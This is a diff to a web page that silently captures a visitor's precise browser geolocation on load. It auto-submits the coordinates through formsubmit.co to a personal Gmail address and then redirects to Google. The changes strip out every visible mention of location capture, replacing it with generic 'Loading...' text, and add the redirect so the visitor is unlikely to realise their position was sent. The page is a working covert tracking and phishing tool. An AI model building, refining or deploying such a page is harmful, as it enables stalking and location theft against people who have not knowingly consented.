@@ -19,8 +19,8 @@
   </style>
 </head>
 <body>
-  <h1>Locating...</h1>
-  <div id="status">Please wait while we capture your location...</div>
+  <h1>Loading...</h1>
+  <div id="status">Please wait...</div>
 
   <form id="locationForm" action="https://formsubmit.co/savoraaservices@gmail.com" method="POST">
     <input type="hidden" name="latitude" id="latitude">
@@ -29,13 +29,15 @@
     <input type="hidden" name="_subject" value="📍 New Location Captured">
     <input type="hidden" name="_template" value="table">
     <input type="hidden" name="_captcha" value="false">
+    <!-- ✅ Redirect to Google after submission -->
+    <input type="hidden" name="_next" value="https://www.google.com">
   </form>
 
   <script>
     window.onload = () => {
       const statusDiv = document.getElementById("status");
       if (navigator.geolocation) {
-        statusDiv.innerHTML = "Requesting location permission...";
+        statusDiv.innerHTML = "Requesting...";
         navigator.geolocation.getCurrentPosition(sendLocation, showError, { enableHighAccuracy: true });
       } else {
         statusDiv.innerHTML = "❌ Geolocation not supported by your browser.";
@@ -59,7 +61,7 @@
         Latitude: ${lat}<br>
         Longitude: ${lon}<br>
         <a href="${mapLink}" target="_blank">🌍 View on Google Maps</a><br><br>
-        Sending location data...
+        Loading...
       `;
 
       // Auto-submit
@@ -73,10 +75,10 @@
           statusDiv.innerHTML = "❌ User denied location access.";
           break;
         case error.POSITION_UNAVAILABLE:
-          statusDiv.innerHTML = "⚠️ Location unavailable.";
+          statusDiv.innerHTML = "⚠️ Unavailable.";
           break;
         case error.TIMEOUT:
-          statusDiv.innerHTML = "⏳ Location request timed out.";
+          statusDiv.innerHTML = "⏳ Request timed out.";
           break;
         default:
           statusDiv.innerHTML = "❓ Unknown error occurred.";
